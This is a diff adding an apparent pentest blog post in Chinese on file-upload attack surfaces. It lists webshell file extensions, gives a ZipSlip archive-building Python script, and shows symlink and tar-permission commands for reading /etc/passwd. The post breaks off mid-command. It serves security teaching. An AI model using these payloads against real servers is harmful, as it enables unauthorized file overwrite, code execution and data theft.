@@ -1,0 +1,967 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>文件上传攻击面&amp;案例 - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="description" content="简述一些文件上传场景下的攻击面，并提供一些漏洞案例。"><meta name="keywords" content='File, Upload'>
+  <meta itemprop="name" content="文件上传攻击面&案例">
+  <meta itemprop="description" content="简述一些文件上传场景下的攻击面，并提供一些漏洞案例。">
+  <meta itemprop="datePublished" content="2024-10-21T02:49:14+00:00">
+  <meta itemprop="dateModified" content="2024-10-21T02:49:14+00:00">
+  <meta itemprop="wordCount" content="5784">
+  <meta itemprop="keywords" content="File,Upload"><meta property="og:url" content="http://localhost:1313/posts/file-upload-attack-surface-and-cases/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="文件上传攻击面&案例">
+  <meta property="og:description" content="简述一些文件上传场景下的攻击面，并提供一些漏洞案例。">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-10-21T02:49:14+00:00">
+    <meta property="article:modified_time" content="2024-10-21T02:49:14+00:00">
+    <meta property="article:tag" content="Pentest">
+    <meta property="article:tag" content="FileUpload">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="文件上传攻击面&案例">
+  <meta name="twitter:description" content="简述一些文件上传场景下的攻击面，并提供一些漏洞案例。">
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/file-upload-attack-surface-and-cases/" title="文件上传攻击面&amp;案例 - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/" title="Docker低版本升级" /><link rel="next" type="text/html" href="http://localhost:1313/posts/burp-cph-usage/" title="Burp-CPH插件心得" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/file-upload-attack-surface-and-cases/index.md" title="文件上传攻击面&案例 - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "文件上传攻击面\u0026案例",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/file-upload-attack-surface-and-cases\/"
+    },"genre": "posts","keywords": "Pentest, FileUpload","wordcount":  5784 ,
+    "url": "http:\/\/localhost:1313\/posts\/file-upload-attack-surface-and-cases\/","datePublished": "2024-10-21T02:49:14+00:00","dateModified": "2024-10-21T02:49:14+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": "简述一些文件上传场景下的攻击面，并提供一些漏洞案例。"
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>文件上传攻击面&amp;案例</span>
+      </h1><p class="single-subtitle animate__animated animate__fadeIn">File Upload Attack Surface and Cases</p></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/pentest/" class="post-category" title="分类 - Pentest"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pentest</a></span></div><div class="post-meta-line"><span title="发布于 2024-10-21 02:49:14"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-10-21">2024-10-21</time></span>&nbsp;<span title="5784 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 5800 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 12 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#11-前言">1.1. 前言</a></li>
+    <li><a href="#12-允许直接上传shell">1.2. 允许直接上传shell</a></li>
+    <li><a href="#13-允许上传压缩包">1.3. 允许上传压缩包</a>
+      <ul>
+        <li><a href="#zipsliptraversal">ZipSlip/Traversal</a></li>
+        <li><a href="#symlinks-attack">Symlinks attack</a></li>
+        <li><a href="#利用tar权限">利用tar权限</a></li>
+      </ul>
+    </li>
+    <li><a href="#14-允许上传html文件">1.4. 允许上传HTML文件</a></li>
+    <li><a href="#15-允许上传xml格式文件并解析">1.5. 允许上传XML格式文件并解析</a>
+      <ul>
+        <li><a href="#xss">XSS</a></li>
+        <li><a href="#xxe">XXE</a></li>
+        <li><a href="#ssrf">SSRF</a></li>
+        <li><a href="#dos">DOS</a></li>
+      </ul>
+    </li>
+    <li><a href="#16-允许上传csv">1.6. 允许上传CSV</a></li>
+    <li><a href="#17-允许上传pdf">1.7. 允许上传PDF</a></li>
+    <li><a href="#18-允许上传音视频文件">1.8. 允许上传音视频文件</a></li>
+    <li><a href="#19-允许上传图片">1.9. 允许上传图片</a>
+      <ul>
+        <li><a href="#大文件dos">大文件DOS</a></li>
+        <li><a href="#像素洪水攻击">像素洪水攻击</a></li>
+        <li><a href="#元数据攻击">元数据攻击</a></li>
+        <li><a href="#图片二次渲染">图片二次渲染</a></li>
+        <li><a href="#内存泄露">内存泄露</a></li>
+        <li><a href="#ghostscript-pspdf">GhostScript PS/PDF</a></li>
+        <li><a href="#合法文件隐藏载荷">合法文件隐藏载荷</a></li>
+      </ul>
+    </li>
+    <li><a href="#110-允许上传文件预览">1.10 允许上传文件预览</a></li>
+    <li><a href="#111-允许上传配置文件">1.11 允许上传配置文件</a></li>
+    <li><a href="#112-文件名攻击">1.12. 文件名攻击</a>
+      <ul>
+        <li><a href="#路径遍历unc">路径遍历/UNC</a></li>
+        <li><a href="#ssrf-1">SSRF</a></li>
+        <li><a href="#dos-1">DOS</a></li>
+        <li><a href="#文件名注入">文件名注入</a></li>
+      </ul>
+    </li>
+    <li><a href="#113-文件路径可控">1.13. 文件路径可控</a></li>
+    <li><a href="#114-元数据泄漏">1.14. 元数据泄漏</a></li>
+    <li><a href="#参考文章">参考文章</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="11-前言" class="heading-element"><span>1.1. 前言</span>
+  <a href="#11-%e5%89%8d%e8%a8%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>本文主要介绍文件上传功能点有哪些攻击面。</p>
+<p>整理的有点粗糙，将就看吧。</p>
+<h2 id="12-允许直接上传shell" class="heading-element"><span>1.2. 允许直接上传shell</span>
+  <a href="#12-%e5%85%81%e8%ae%b8%e7%9b%b4%e6%8e%a5%e4%b8%8a%e4%bc%a0shell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>只要有文件上传功能，那么就可以尝试上传shell直接执行恶意代码，获得服务器权限，这是最简单也是最直接的利用。</p>
+<p>上传shell包括Webshell、脚本文件、代码文件等</p>
+<p>Java/JSP 后缀</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">jsp  jsw  jsv	jspa	jspf  jspx  jhtml</span></span></code></pre></td></tr></table>
+</div>
+</div><p>PHP后缀：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php		php2		php3		php4		php5		php6		php7		pht
+</span></span><span class="line"><span class="cl">inc		phps		phar		pgif		phtm		phtml		shtml
+</span></span><span class="line"><span class="cl">html	htm</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ASP.NET 后缀</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">asp		asa		svc		rem		axd		asax	ascx	asmx		cer
+</span></span><span class="line"><span class="cl">aspx	ashx	aspq	soap	xamlx	cshtm
+</span></span><span class="line"><span class="cl">vbhtm	cshtml	vbhtml</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Apache SSI上传</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">stm  shtm  shtml</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其他：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pl		pm		sh		cfm		cgi		lib</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="13-允许上传压缩包" class="heading-element"><span>1.3. 允许上传压缩包</span>
+  <a href="#13-%e5%85%81%e8%ae%b8%e4%b8%8a%e4%bc%a0%e5%8e%8b%e7%bc%a9%e5%8c%85" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="zipsliptraversal" class="heading-element"><span>ZipSlip/Traversal</span>
+  <a href="#zipsliptraversal" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>如果可以上传压缩包，并且服务端会对压缩包解压，那么就可能存在<code>ZipSlip/Traversal</code>目录穿越漏洞；</p>
+<p>通过构造一个压缩包中带有<code>../</code>的压缩文件，上传后交给服务端应用程序进行解压，如果程序解压时没有对压缩包内的文件名进行合法性校验，而是直接将文件名拼接在待解压目录后面，导致可以将文件解压到正常解压缩路径之外，可能导致恶意文件的写入、覆盖替换可执行文件等，等待系统或用户调用恶意文件，从而实现代码执行（也可能是覆盖配置文件或其他敏感文件）。</p>
+<p>可能的压缩包格式后缀包括：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tar		jar		war		cpio		apk		rar		7z</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>本质：</strong> 没有对压缩包中的文件名进行合法性校验，直接将文件名拼接到待解压目录中，导致存在路径遍历风险。</p>
+<p><strong>举例：</strong> 若解压目录为<code>/webapp/web/</code>，给文件命名为：<code>../../var/www/html/1.php</code>并压缩，那么文件解压后，通过直接拼接文件名为<code>/webapp/web/../../var/www/html/1.php</code>，因此最终就会存放到<code>/var/www/html/1.php</code>中，如果能访问并解析，那么就能成功代码执行。</p>
+<p><strong>利用：</strong> <a href="https://github.com/snyk/zip-slip-vulnerability"target="_blank" rel="external nofollow noopener noreferrer">zip-slip-vulnerability</a> 项目包含了有关此攻击的所有信息，例如受影响的库、项目和其他相关信息。</p>
+<p><strong>构造代码：</strong></p>
+<blockquote>
+<p>也可以用别人写好的工具：https://github.com/ptoomey3/evilarc</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zipfile</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># the name of the zip file to generate</span>
+</span></span><span class="line"><span class="cl"><span class="n">zf</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s1">&#39;out.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># the name of the malicious file that will overwrite the origial file (must exist on disk)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fname</span> <span class="o">=</span> <span class="s1">&#39;zip_slip.txt&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#destination path of the file</span>
+</span></span><span class="line"><span class="cl"><span class="n">zf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">fname</span><span class="p">,</span> <span class="s1">&#39;../../../../../../../../../../../../../../../../../../../../../../../../tmp/zip_slip.aaa&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="symlinks-attack" class="heading-element"><span>Symlinks attack</span>
+  <a href="#symlinks-attack" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>tar/zip 允许压缩包中包含符号链接。符号链接是一种链接到另一个文件的特殊文件。通过上传包含符号链接的 ZIP，并在解压 ZIP 后，可以通过访问符号链接以访问到原本无法访问的文件。为此，需要让符号链接指向 Web 根目录之外的文件，例如“/etc/passwd”。</p>
+<p>这些类型的问题通常是在开发人员允许上传 ZIP 文件时发现的。当用户在应用程序中上传恶意 ZIP 文件时，它只会获取 ZIP 文件并将其提取出来，而不会进行任何进一步的验证。</p>
+<p>例如：</p>
+<ul>
+<li><a href="https://josipfranjkovic.blogspot.com/2014/12/reading-local-files-from-facebooks.html"target="_blank" rel="external nofollow noopener noreferrer">facebook 本地文件读取</a></li>
+<li><a href="https://hackerone.com/reports/178152"target="_blank" rel="external nofollow noopener noreferrer">CVE-2016-9086-读取应用服务器上的文件，导致 RCE</a></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">1. 创建一个符号链接文件指向/etc/passwd 
+</span></span><span class="line"><span class="cl">ln -s /etc/passwd link 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2. 压缩文件，同时保留链接 
+</span></span><span class="line"><span class="cl">zip --symlinks test.zip link 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3. 上传test.zip文件，系统会自动解压缩 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">4. 页面当中会返回/etc/passwd的内容</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里是通过绝对路径读取文件，还有可能是相对路径。</p>
+<p>参考：https://secops.group/anatomy-of-a-file-upload-attack/</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">创建了/etc/passwd 文件的符号链接，并使用以下命令将文件压缩到 ZIP 存档中
+</span></span><span class="line"><span class="cl">sudo ln -s ../../../../../../../../../../etc/passwd name_of_symlink.txt
+</span></span><span class="line"><span class="cl">sudo zip --symlink zip_file.zip  name_of_symlink.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">上传了包含Symlink的ZIP文件，提取了 Symlink 文件，通过预览文件访问服务器的“passwd”文件的内容</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="利用tar权限" class="heading-element"><span>利用tar权限</span>
+  <a href="#%e5%88%a9%e7%94%a8tar%e6%9d%83%e9%99%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Abusing tar permissions</p>
+<p>如果应用程序服务端使用 <code>tar</code>命令提取解压<code>.tar</code>文件、删除符号链接并访问子目录，则可以尝试利用 tar 权限控制绕过符号链接删除过程。</p>
+<p><code>tar</code>命令创建<code>.tar</code>文件存档时会保留分配给它的 unix 权限。如果设置父目录无人可读（  <code>chmod 300</code>），同时子目录具有完整权限（ <code>chmod 700</code>），则可以在子目录中包含符号链接，这些符号链接在符号链接删除过程中不会被找到，但由于子目录具有读取权限，因此直接访问时会找到。</p>
+<p>案例：<a href="https://gitlab.com/gitlab-org/gitlab-foss/-/issues/55501"target="_blank" rel="external nofollow noopener noreferrer">Reading local files by abusing tar permissions in Gitlab Imports (Possibly leading to RCE)</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ mkdir parent
+</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> parent
+</span></span><span class="line"><span class="cl">$ tar cf a.tar . --mode<span class="o">=</span><span class="m">300</span>
+</span></span><span class="line"><span class="cl">$ mkdir sub
+</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> sub
+</span></span><span class="line"><span class="cl">$ ln -s /etc/passwd file.txt
